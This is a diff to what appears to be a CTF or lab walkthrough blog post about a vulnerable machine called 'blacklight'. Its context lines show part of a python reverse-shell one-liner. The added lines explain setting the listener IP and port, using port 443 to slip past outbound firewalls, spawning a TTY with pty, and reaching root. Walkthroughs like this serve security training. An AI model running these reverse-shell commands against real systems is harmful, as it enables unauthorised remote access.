@@ -95,7 +95,7 @@ Perfect, it looks like the box is making a connection to our host.
 
 Which means that the box is executing commands, but we don't see the output (therefore it is called blind).
 
-### iii. Low Privilege Shell
+## iii. Low Privilege Shell
 
 Now that we know that the box is able to execute commands, we can try a reverse shell.
 
@@ -106,6 +106,23 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ~~~
 
+Make sure to update the command with your IP Address & Listening Port.
+
+Using Port 443 is more reliable, just in case the host has some sort of firewall setup that is blocking outbound connections on unknown ports.
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/revshell.png)
+
+After executing the command, it seems that we got a reverse shell.
+
+We are able to use this python one-liner to spawn a TTY shell.
+
+~~~
+python -c 'import pty;pty.spawn("/bin/bash")'
+~~~
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/pty.png)
+
+Looks like we are root already!
 
 
 
